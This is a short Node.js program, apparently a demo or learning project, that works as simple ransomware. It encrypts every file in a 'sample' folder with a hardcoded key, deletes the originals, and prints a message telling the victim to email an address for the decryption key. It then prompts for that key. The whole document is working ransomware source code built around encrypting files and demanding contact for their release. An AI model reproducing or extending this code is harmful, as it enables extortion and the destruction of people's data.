var encryptor = require("file-encryptor");
var fs = require("fs");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const sample = "./sample/";
var encryptionKey = "Klay"; 

function encryptFiles() {
  fs.readdirSync(sample).forEach((file) => {
    encryptor.encryptFile(
      `${sample}/${file}`,
      `${sample}/${file}.encrypted`,
      encryptionKey,
      function (err) {
        if (err) {
          console.error("Encryption error:", err);
        } else {
          fs.unlinkSync(`${sample}/${file}`);
          console.log(`Encryption of ${file} is complete.`);
        }
      }
    );
  });
  console.log("Files are encrypted. Contact me at klayiee@gmail.com for the Decryption key");
}

function decryptFiles(decryptionKey) {
  if (decryptionKey !== encryptionKey) {
    console.log("Wrong decryption key. Please make sure you have entered the correct key.");
    rl.close();
    return;
  }

  fs.readdirSync(sample).forEach((file) => {
    encryptor.decryptFile(
      `${sample}/${file}`,
      `${sample}/${file.replace(".encrypted", "")}`,
      decryptionKey,
      function (err) {
        if (err) {
          console.error("Decryption error:", err);
        } else {
          fs.unlinkSync(`${sample}/${file}`);
          console.log(`Decryption of ${file} is complete.`);
        }
      }
    );
  });
}

function start() {
  encryptFiles(); 

 
  rl.question(
    "Enter decryption key: ",
    (decryptionKey) => {
      decryptFiles(decryptionKey);
      rl.close();
    }
  );
}

start();